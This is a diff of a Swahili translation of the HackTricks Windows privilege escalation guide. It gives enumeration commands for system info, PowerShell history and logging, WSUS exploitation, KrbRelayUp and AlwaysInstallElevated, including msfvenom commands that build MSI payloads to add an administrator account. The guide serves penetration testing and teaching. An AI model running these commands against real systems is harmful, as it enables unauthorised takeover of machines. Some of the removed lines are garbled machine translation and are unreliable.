@@ -1,24 +1,24 @@
-# Kupandisha Kiwango cha Mamlaka kwenye Windows
+# Kupandisha Mamlaka ya Kipekee kwa Windows
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) maalum
+* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **fuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-### **Zana bora ya kutafuta njia za kupandisha kiwango cha mamlaka kwenye Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+### **Zana bora ya kutafuta njia za kupandisha mamlaka ya kipekee kwa Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 ## Nadharia ya Awali ya Windows
 
-### Vitambulisho vya Upatikanaji
+### Vitambulisho vya Kufikia
 
-**Ikiwa haujui ni nini Vitambulisho vya Upatikanaji vya Windows, soma ukurasa ufuatao kabla ya kuendelea:**
+**Ikiwa haujui ni nini Vitambulisho vya Kufikia vya Windows, soma ukurasa ufuatao kabla ya kuendelea:**
 
 {% content-ref url="access-tokens.md" %}
 [access-tokens.md](access-tokens.md)
@@ -34,7 +34,7 @@
 
 ### Viwango vya Uadilifu
 
-**Ikiwa haujui ni nini viwango vya uadilifu kwenye Windows, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**
+**Ikiwa haujui ni nini viwango vya uadilifu katika Windows unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**
 
 {% content-ref url="integrity-levels.md" %}
 [integrity-levels.md](integrity-levels.md)
@@ -42,17 +42,17 @@
 
 ## Udhibiti wa Usalama wa Windows
 
-Kuna mambo tofauti kwenye Windows ambayo yanaweza **kukuzuia kuchunguza mfumo**, kuendesha faili za kutekelezwa, au hata **kugundua shughuli zako**. Unapaswa **kusoma** ukurasa **ufuatao** na **kuchunguza** ulinzi huu **kabla ya** kuanza uchunguzi wa kupandisha kiwango cha mamlaka:
+Kuna mambo tofauti katika Windows ambayo yanaweza **kukuzuia kuchambua mfumo**, kutekeleza programu za kutekelezeka au hata **kugundua shughuli zako**. Unapaswa **kusoma** ukurasa ufuatao na **kuchambua** mifumo hii **ya ulinzi** kabla ya kuanza uchambuzi wa kupandisha mamlaka ya kipekee:
 
 {% content-ref url="../authentication-credentials-uac-and-efs.md" %}
 [authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
 {% endcontent-ref %}
 
-## Habari za Mfumo
+## Taarifa za Mfumo
 
-### Uchunguzi wa habari za toleo
+### Uchambuzi wa Taarifa za Toleo
 
-Angalia ikiwa toleo la Windows lina kasoro yoyote inayojulikana (angalia pia visasa vilivyowekwa).
+Angalia kama toleo la Windows lina kasoro yoyote inayojulikana (angalia pia visasa vilivyotekelezwa).
 ```bash
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
@@ -65,9 +65,9 @@ wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architec
 Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
 Get-Hotfix -description "Security update" #List only "Security Update" patches
 ```
-### Mbinu za Uvamizi wa Toleo
+### Mashambulizi ya Toleo
 
-[Site](https://msrc.microsoft.com/update-guide/vulnerability) hii ni muhimu kwa kutafuta habari za kina kuhusu udhaifu wa usalama wa Microsoft. Hii ni database yenye zaidi ya udhaifu wa usalama 4,700, ikionyesha **eneo kubwa la shambulio** ambalo mazingira ya Windows yanatoa.
+Hii [tovuti](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta habari za kina kuhusu udhaifu wa usalama wa Microsoft. Hii hifadhidata ina zaidi ya udhaifu wa usalama 4,700, ikionyesha **eneo kubwa la mashambulizi** ambalo mazingira ya Windows yanatoa.
 
 **Kwenye mfumo**
 
@@ -76,12 +76,12 @@ Get-Hotfix -description "Security update" #List only "Security Update" patches
 * [_watson_](https://github.com/rasta-mouse/Watson)
 * [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyowekwa)_
 
-**Kwa kutumia habari za mfumo kwenye kompyuta**
+**Kwa habari za mfumo kwa ndani**
 
 * [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 * [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
 
-**Github repos ya mbinu za uvamizi:**
+**Makusanyo ya Github ya mashambulizi:**
 
 * [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
 * [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
@@ -89,23 +89,13 @@ Get-Hotfix -description "Security update" #List only "Security Update" patches
 
 ### Mazingira
 
-Je, kuna habari za siri/za thamani zilizohifadhiwa kwenye mazingira ya pembejeo?
+Je, kuna siri yoyote/taarifa muhimu iliyohifadhiwa kwenye mazingira ya mazingira?
 ```bash
 set
 dir env:
 Get-ChildItem Env: | ft Key,Value
 ```
 ### Historia ya PowerShell
-
-PowerShell ni lugha ya skrini ya amri na mazingira ya utendaji kazi ambayo inatumika kwa kazi za usimamizi na uendeshaji wa mfumo katika mifumo ya Windows. Inaruhusu watumiaji kutekeleza amri na script za PowerShell kwa kufanya kazi na vitu vya PowerShell kama vile moduli, cmdlets, na kazi.
-
-Historia ya PowerShell inaweza kufuatiliwa nyuma hadi mwaka 2002 wakati Microsoft ilianza kufanya kazi kwenye mradi huo. Ilitolewa kwa mara ya kwanza kama sehemu ya Windows Server 2003 R2 na Windows Vista. Tangu wakati huo, PowerShell imekuwa sehemu muhimu ya mifumo ya Windows na imeendelea kuboreshwa na kusasishwa katika matoleo yake yanayofuata.
-
-PowerShell ina kumbukumbu ya amri zote zilizotekelezwa na mtumiaji. Kumbukumbu hii inaitwa "PowerShell history" na inaweza kuwa na habari muhimu kwa watumiaji wa ngazi ya juu au wadukuzi. Kwa mfano, inaweza kuonyesha amri zilizotekelezwa na watumiaji wa mfumo au amri zilizotekelezwa na watumiaji wa kawaida ambazo zinaweza kusababisha uwezekano wa kupata ufikiaji wa kiwango cha juu.
-
-Kumbukumbu ya PowerShell history inahifadhiwa kwenye faili ya historia ya PowerShell ambayo inapatikana kwenye mfumo wa uendeshaji. Kwa kawaida, faili hii iko katika saraka ya "C:\Users\<jina la mtumiaji>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\" na inaitwa "ConsoleHost_history.txt". Faili hii inaorodhesha amri zote zilizotekelezwa na mtumiaji pamoja na maelezo mengine kama vile wakati wa utekelezaji.
-
-Kwa wadukuzi au watumiaji wenye ujuzi, kumbukumbu ya PowerShell history inaweza kutumiwa kwa faida yao. Wanaweza kutumia habari hii kugundua amri zilizotekelezwa na watumiaji wengine, kuchunguza mifumo ya kompyuta, au hata kutekeleza mashambulizi ya kuvuka mipaka. Ni muhimu kwa watumiaji kufahamu kuwa kumbukumbu hii inaweza kuwa na habari nyeti na inapaswa kulindwa kwa uangalifu.
 ```bash
 ConsoleHost_history #Find the PATH where is saved
 
@@ -115,7 +105,7 @@ type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.tx
 cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
-### Faili za Kumbukumbu za PowerShell Transcript
+### Faili za Uandishi wa PowerShell
 
 Unaweza kujifunza jinsi ya kuwasha hii kwenye [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
 ```bash
@@ -130,179 +120,41 @@ dir C:\Transcripts
 Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
 Stop-Transcript
 ```
-### Kurekodi Moduli ya PowerShell
+### Kumbukumbu ya Moduli ya PowerShell
 
-Maelezo ya utekelezaji wa mfuatano wa PowerShell yanarekodiwa, ikijumuisha amri zilizotekelezwa, wito wa amri, na sehemu za hati. Walakini, maelezo kamili ya utekelezaji na matokeo ya matokeo huenda yasirekodiwe.
+Maelezo ya utekelezaji wa mfuatano wa PowerShell yanarekodiwa, yakijumuisha amri zilizotekelezwa, mialiko ya amri, na sehemu za hati za maandishi. Walakini, maelezo kamili ya utekelezaji na matokeo ya pato huenda yakawa hayajachukuliwa.
 
-Ili kuwezesha hili, fuata maagizo katika sehemu ya "Faili za Kumbukumbu" ya nyaraka, uchague **"Kurekodi Moduli"** badala ya **"Kurekodi PowerShell"**.
+Ili kuwezesha hili, fuata maagizo katika sehemu ya "Faili za Kumbukumbu" ya nyaraka, ukipendelea **"Kumbukumbu ya Moduli"** badala ya **"Kumbukumbu ya PowerShell"**.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 ```
-Ili kuona matukio 15 ya mwisho kutoka kwenye magogo ya Powershell, unaweza kutekeleza:
+Ili kuona matukio 15 ya mwisho kutoka kwenye magogo ya Powershell unaweza kutekeleza:
 ```bash
 Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
 ```
-### Kurekodi wa Skripti za PowerShell
+### Kumbukumbu za **Kuzuia Bloki za Script**
 
-Shughuli kamili na rekodi kamili ya yaliyomo ya utekelezaji wa skripti inakamatwa, ikihakikisha kuwa kila kipande cha nambari kinaandikwa kama inavyoendesha. Mchakato huu unahifadhi mkia kamili wa ukaguzi wa kila shughuli, ambao ni muhimu kwa uchunguzi wa kisayansi na uchambuzi wa tabia mbaya. Kwa kurekodi shughuli zote wakati wa utekelezaji, ufahamu wa kina juu ya mchakato unapatikana.
+Shughuli kamili na rekodi kamili ya yaliyomo ya utekelezaji wa script inachukuliwa, ikahakikisha kuwa kila bloki ya nambari inadokolewa wakati inaendeshwa. Mchakato huu unahifadhi reli kamili ya ukaguzi wa kila shughuli, yenye thamani kwa uchunguzi wa kisayansi na uchambuzi wa tabia mbaya. Kwa kudokumenti shughuli zote wakati wa utekelezaji, ufahamu wa kina katika mchakato unatolewa.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 ```
-Matukio ya kuingiza skrini yanaweza kupatikana ndani ya Mwangalizi wa Matukio ya Windows kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
-Ili kuona matukio 20 ya mwisho, unaweza kutumia:
+Kumbukumbu za matukio kwa Block ya Script inaweza kupatikana ndani ya Mwangalizi wa Matukio ya Windows kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
+Ili kuona matukio 20 ya mwisho unaweza kutumia:
 ```bash
 Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
 ```
 ### Mipangilio ya Mtandao
-
-#### Introduction
-
-#### Utangulizi
-
-In this section, we will discuss various internet settings that can be configured on a Windows system. These settings control how the system interacts with the internet and can affect its security and performance.
-
-Katika sehemu hii, tutajadili mipangilio mbalimbali ya mtandao inayoweza kusanidiwa kwenye mfumo wa Windows. Mipangilio hii inadhibiti jinsi mfumo unavyoshirikiana na mtandao na inaweza kuathiri usalama na utendaji wake.
-
-#### Proxy Settings
-
-#### Mipangilio ya Proksi
-
-Proxy settings allow a system to route its internet traffic through a proxy server. This can be useful for privacy, bypassing network restrictions, or caching web content.
-
-Mipangilio ya proksi inaruhusu mfumo kupeleka trafiki yake ya mtandao kupitia seva ya proksi. Hii inaweza kuwa na manufaa kwa faragha, kuvuka vizuizi vya mtandao, au kuhifadhi yaliyomo ya wavuti.
-
-To configure proxy settings on a Windows system, follow these steps:
-
-Kuweka mipangilio ya proksi kwenye mfumo wa Windows, fuata hatua hizi:
-
-1. Open the **Control Panel** and navigate to **Internet Options**.
-
-1. Fungua **Control Panel** na nenda kwenye **Internet Options**.
-
-2. In the **Internet Options** window, go to the **Connections** tab and click on the **LAN settings** button.
-
-2. Katika dirisha la **Internet Options**, nenda kwenye kichupo cha **Connections** na bonyeza kitufe cha **LAN settings**.
-
-3. In the **Local Area Network (LAN) Settings** window, check the box for **Use a proxy server for your LAN**.
-
-3. Katika dirisha la **Local Area Network (LAN) Settings**, angalia sanduku la **Use a proxy server for your LAN**.
-
-4. Enter the IP address or hostname of the proxy server in the **Address** field and the port number in the **Port** field.
-
-4. Ingiza anwani ya IP au jina la mwenyeji wa seva ya proksi kwenye uga wa **Address** na nambari ya bandari kwenye uga wa **Port**.
-
-5. If the proxy server requires authentication, click on the **Advanced** button and enter the username and password in the respective fields.
-
-5. Ikiwa seva ya proksi inahitaji uwakiki, bonyeza kitufe cha **Advanced** na ingiza jina la mtumiaji na nywila kwenye uga husika.
-
-6. Click **OK** to save the changes and close the windows.
-
-6. Bonyeza **OK** ili kuhifadhi mabadiliko na kufunga dirisha.
-
-#### DNS Settings
-
-#### Mipangilio ya DNS
-
-DNS settings determine how a system resolves domain names to IP addresses. By default, Windows systems use the DNS servers provided by the network's DHCP server. However, you can manually configure DNS settings to use specific DNS servers.
-
-Mipangilio ya DNS inaamua jinsi mfumo unavyotatua majina ya kikoa kuwa anwani za IP. Kwa chaguo-msingi, mifumo ya Windows hutumia seva za DNS zinazotolewa na seva ya DHCP ya mtandao. Walakini, unaweza kusanidi mipangilio ya DNS kwa kutumia seva za DNS maalum.
-
-To configure DNS settings on a Windows system, follow these steps:
-
-Kuweka mipangilio ya DNS kwenye mfumo wa Windows, fuata hatua hizi:
-
-1. Open the **Control Panel** and navigate to **Network and Internet**.
-
-1. Fungua **Control Panel** na nenda kwenye **Network and Internet**.
-
-2. Click on **Network and Sharing Center**.
-
-2. Bonyeza **Network and Sharing Center**.
-
-3. In the **Network and Sharing Center** window, click on **Change adapter settings**.
-
-3. Katika dirisha la **Network and Sharing Center**, bonyeza **Change adapter settings**.
-
-4. Right-click on the network adapter you want to configure and select **Properties**.
-
-4. Bonyeza kulia kwenye kifaa cha mtandao unachotaka kusanidi na chagua **Properties**.
-
-5. In the **Properties** window, select **Internet Protocol Version 4 (TCP/IPv4)** and click on the **Properties** button.
-
-5. Katika dirisha la **Properties**, chagua **Internet Protocol Version 4 (TCP/IPv4)** na bonyeza kitufe cha **Properties**.
-
-6. In the **Internet Protocol Version 4 (TCP/IPv4) Properties** window, select **Use the following DNS server addresses**.
-
-6. Katika dirisha la **Internet Protocol Version 4 (TCP/IPv4) Properties**, chagua **Use the following DNS server addresses**.
-
-7. Enter the IP addresses of the preferred and alternate DNS servers in the respective fields.
-
-7. Ingiza anwani za IP za seva za DNS zilizopendelewa na mbadala kwenye uga husika.
-
-8. Click **OK** to save the changes and close the windows.
-
-8. Bonyeza **OK** ili kuhifadhi mabadiliko na kufunga dirisha.
-
-#### Firewall Settings
-
-#### Mipangilio ya Firewall
-
-Firewall settings control the incoming and outgoing network traffic on a system. Windows systems have a built-in firewall that can be configured to allow or block specific connections.
-
-Mipangilio ya firewall inadhibiti trafiki ya mtandao ya kuingia na kutoka kwenye mfumo. Mifumo ya Windows ina firewall iliyojengwa ambayo inaweza kusanidiwa kuruhusu au kuzuia uhusiano maalum.
-
-To configure firewall settings on a Windows system, follow these steps:
-
-Kuweka mipangilio ya firewall kwenye mfumo wa Windows, fuata hatua hizi:
-
-1. Open the **Control Panel** and navigate to **System and Security**.
-
-1. Fungua **Control Panel** na nenda kwenye **System and Security**.
-
-2. Click on **Windows Defender Firewall**.
-
-2. Bonyeza **Windows Defender Firewall**.
-
-3. In the **Windows Defender Firewall** window, click on **Advanced settings**.
-
-3. Katika dirisha la **Windows Defender Firewall**, bonyeza **Advanced settings**.
-
-4. In the **Windows Defender Firewall with Advanced Security** window, you can configure inbound and outbound rules to allow or block specific connections.
-
-4. Katika dirisha la **Windows Defender Firewall with Advanced Security**, unaweza kusanidi sheria za kuingia na kutoka ili kuruhusu au kuzuia uhusiano maalum.
-
-5. Right-click on **Inbound Rules** or **Outbound Rules** and select **New Rule** to create a new rule.
-
-5. Bonyeza kulia kwenye **Inbound Rules** au **Outbound Rules** na chagua **New Rule** ili kuunda sheria mpya.
-
-6. Follow the wizard to specify the rule's properties, such as the protocol, port, and action (allow or block).
-
-6. Fuata mwongozo ili kubainisha mali za sheria, kama itifaki, bandari, na hatua (kuruhusu au kuzuia).
-
-7. Click **Finish** to save the rule.
-
-7. Bonyeza **Finish** ili kuhifadhi sheria.
-
-By configuring these internet settings, you can customize how your Windows system interacts with the internet and enhance its security and performance.
-
-Kwa kusanidi mipangilio hii ya mtandao, unaweza kubinafsisha jinsi mfumo wako wa Windows unavyoshirikiana na mtandao na kuimarisha usalama na utendaji wake.
 ```bash
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 ```
-### Madirisha
-
-Madirisha ni sehemu za uhifadhi wa data kwenye kompyuta yako. Kila dirisha ina jina la kipekee na inaweza kuwa na faili na folda ndani yake. Kuna aina tofauti za madirisha, kama vile C: drive, D: drive, na kadhalika. Madirisha ya kawaida kwenye mfumo wa Windows ni C: drive, ambayo mara nyingi ina mfumo wa uendeshaji, na D: drive, ambayo inaweza kutumika kwa uhifadhi wa data zaidi.
-
-Kuwa na ufahamu wa madirisha kwenye kompyuta yako ni muhimu katika kuelewa jinsi ya kufikia na kusimamia faili na folda zako. Unaweza kutumia amri za mfumo kama vile `dir` kuona yaliyomo kwenye dirisha fulani, au `cd` kuhamia kutoka dirisha moja hadi lingine.
-
-Ni muhimu pia kuzingatia usalama wa madirisha yako. Kuhakikisha kuwa madirisha yako yamehifadhiwa vizuri na kuwa na ufikiaji wa kutosha ni muhimu katika kuzuia upenyezaji wa data na kuboresha usalama wa mfumo wako.
+### Madereva
 ```bash
 wmic logicaldisk get caption || fsutil fsinfo drives
 wmic logicaldisk get caption,description,providername
@@ -310,9 +162,9 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 ```
 ## WSUS
 
-Unaweza kudhoofisha mfumo ikiwa sasisho hazijaulizwa kwa kutumia http**S** bali http.
+Unaweza kudukua mfumo ikiwa visasisho havijaulizwa kutumia http**S** bali http.
 
-Anza kwa kuhakiki ikiwa mtandao unatumia sasisho za WSUS zisizo za SSL kwa kukimbia yafuatayo:
+Anza kwa kuangalia ikiwa mtandao unatumia sasisho la WSUS lisilotumia SSL kwa kukimbia amri ifuatayo:
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 ```
@@ -323,9 +175,9 @@ WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
 ```
 Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ni sawa na `1`.
 
-Basi, **inaweza kudukuliwa.** Ikiwa usajili wa mwisho ni sawa na 0, basi, kuingia kwa WSUS itapuuzwa.
+Kisha, **inaweza kutumiwa kwa faida.** Ikiwa usajili wa mwisho ni sawa na 0, basi, kuingia kwa WSUS itapuuzwa.
 
-Ili kudukua udhaifu huu, unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Hizi ni hatari za kudukua zana za kuingiza sasisho za 'bandia' katika trafiki ya WSUS isiyo ya SSL.
+Ili kutumia udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Hizi ni hati za kudukua zilizotumiwa kama silaha za MiTM kuingiza sasisho za 'bandia' katika trafiki ya WSUS isiyo ya SSL.
 
 Soma utafiti hapa:
 
@@ -334,59 +186,49 @@ Soma utafiti hapa:
 **WSUS CVE-2020-1013**
 
 [**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
-Kimsingi, hii ndio kasoro ambayo kosa hili linadukua:
+Kimsingi, hii ndio kasoro ambayo kosa hili linatumia:
 
-> Ikiwa tuna uwezo wa kurekebisha proksi yetu ya mtumiaji wa ndani, na Sasisho za Windows hutumia proksi iliyoconfigure katika mipangilio ya Internet Explorer, kwa hivyo tuna uwezo wa kukimbia [PyWSUS](https://github.com/GoSecure/pywsus) kwa kiwango cha ndani ili kuvuruga trafiki yetu na kukimbia nambari kama mtumiaji aliyeinuliwa kwenye mali yetu.
+> Ikiwa tuna uwezo wa kurekebisha proksi yetu ya mtumiaji wa ndani, na Sasisho za Windows zinatumia proksi iliyoconfigure katika mipangilio ya Internet Explorer, kwa hivyo tuna uwezo wa kutekeleza [PyWSUS](https://github.com/GoSecure/pywsus) kwa usalama kuingilia trafiki yetu wenyewe na kutekeleza nambari kama mtumiaji aliyeinuliwa kwenye mali yetu.
 >
-> Zaidi ya hayo, tangu huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, pia itatumia uhifadhi wake wa vyeti. Ikiwa tunazalisha cheti cha kujisaini kwa jina la mwenyeji wa WSUS na kuongeza cheti hiki kwenye uhifadhi wa vyeti wa mtumiaji wa sasa, tutaweza kuvuruga trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii vifaa kama HSTS kutekeleza uthibitisho wa aina ya kuamini kwa mara ya kwanza kwenye cheti. Ikiwa cheti kilichowasilishwa kinaaminika na mtumiaji na kina jina la mwenyeji sahihi, kitakubaliwa na huduma.
+> Zaidi ya hayo, tangu huduma ya WSUS itumie mipangilio ya mtumiaji wa sasa, itatumia pia hifadhi yake ya vyeti. Ikiwa tunazalisha cheti cha kujisaini kwa jina la mwenyeji wa WSUS na kuongeza cheti hiki kwenye hifadhi ya vyeti ya mtumiaji wa sasa, tutaweza kuingilia trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mbinu kama HSTS kutekeleza uthibitisho wa aina ya kuamini kwa matumizi ya kwanza kwenye cheti. Ikiwa cheti kilichowasilishwa kinaaminika na mtumiaji na kina jina la mwenyeji sahihi, kitakubaliwa na huduma.
 
-Unaweza kutumia udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (baada ya kuachiwa).
+Unaweza kutumia udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (baada ya kutolewa).
 
 ## KrbRelayUp
 
-Kuna udhaifu wa **kuinua haki za mtumiaji wa ndani** katika mazingira ya Windows ya **kikoa** chini ya hali maalum. Hali hizi ni pamoja na mazingira ambapo **LDAP signing haijaamrishwa,** watumiaji wana haki za kujisimamia kuruhusu kuweka **Utekelezaji wa Kizuizi cha Rasilimali (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya kikoa. Ni muhimu kutambua kuwa **mahitaji** haya yanakidhiwa kwa kutumia **mipangilio ya msingi**.
+Kuna **udhaifu wa kubadilisha mamlaka ya ndani** katika mazingira ya **domain** ya Windows chini ya hali maalum. Hali hizi ni pamoja na mazingira ambapo **LDAP signing haijatekelezwa,** watumiaji wanamiliki haki za kujiconfigure **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya uwanja. Ni muhimu kutambua kuwa mahitaji haya yanakidhiwa kwa kutumia **mipangilio ya msingi**.
 
-Pata udhaifu huu katika [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
+Pata **udukuzi** katika [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
 
 Kwa habari zaidi kuhusu mchakato wa shambulio angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)
 
 ## AlwaysInstallElevated
 
-**Ikiwa** usajili huu 2 umewezeshwa (thamani ni **0x1**), basi watumiaji wenye haki yoyote wanaweza **kusanikisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.
+**Ikiwa** hizi 2 registers zime **wezeshwa** (thamani ni **0x1**), basi watumiaji wa aina yoyote ya mamlaka wanaweza **kusanikisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 ### Malipo ya Metasploit
-
-Metasploit ni chombo maarufu cha kufanya udukuzi ambacho kinatumika kwa kubuni na kutekeleza malipo. Malipo haya yanaweza kutumiwa kwa madhumuni mbalimbali, ikiwa ni pamoja na kudhibiti kompyuta zilizodukuliwa, kuongeza mamlaka ya mtumiaji, au kufanya shughuli zingine za udukuzi.
-
-Metasploit inatoa aina tofauti za malipo ambazo zinaweza kutumiwa kulingana na mahitaji ya udukuzi. Baadhi ya malipo maarufu ni pamoja na:
-
-- **Reverse Shell Payloads**: Malipo haya yanaruhusu mtumiaji kudhibiti kompyuta iliyodukuliwa kutoka kwa kifaa chao cha kudukua. Hii inawezesha mtumiaji kufanya shughuli za udukuzi kwenye kompyuta iliyodukuliwa kwa urahisi.
-
-- **Meterpreter Payloads**: Malipo haya yanatoa uwezo wa kudhibiti kompyuta iliyodukuliwa kwa njia ya kipekee inayoitwa "Meterpreter". Meterpreter inatoa zana nyingi za kudukua na kufanya shughuli za udukuzi, kama vile kukusanya habari, kudhibiti faili, na kufanya uchunguzi wa mtandao.
-
-- **Web Payloads**: Malipo haya yanaruhusu mtumiaji kutekeleza shughuli za udukuzi kupitia tovuti iliyodukuliwa. Hii inaweza kujumuisha kutekeleza mashambulizi ya msimbo wa upande wa mteja au kuchukua udhibiti wa seva ya wavuti.
-
-Kwa kuzingatia malipo haya, Metasploit inatoa njia mbalimbali za kubuni na kutekeleza malipo kulingana na mahitaji ya udukuzi. Hii inawawezesha wadukuzi kufanya shughuli za udukuzi kwa ufanisi na kwa urahisi.
 ```bash
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
 ```
-Ikiwa una kikao cha meterpreter unaweza kutekeleza mbinu hii kiotomatiki kwa kutumia moduli **`exploit/windows/local/always_install_elevated`**
+Ikiwa una kikao cha meterpreter unaweza kiotomatisha mbinu hii kwa kutumia moduli **`exploit/windows/local/always_install_elevated`**
 
 ### PowerUP
 
-Tumia amri ya `Write-UserAddMSI` kutoka kwa power-up ili kuunda ndani ya saraka ya sasa faili ya Windows MSI ili kuinua mamlaka. Skripti hii inaandika faili ya usanidi ya MSI iliyopangwa ambayo inaomba kuongeza mtumiaji/kikundi (kwa hivyo utahitaji ufikiaji wa GUI):
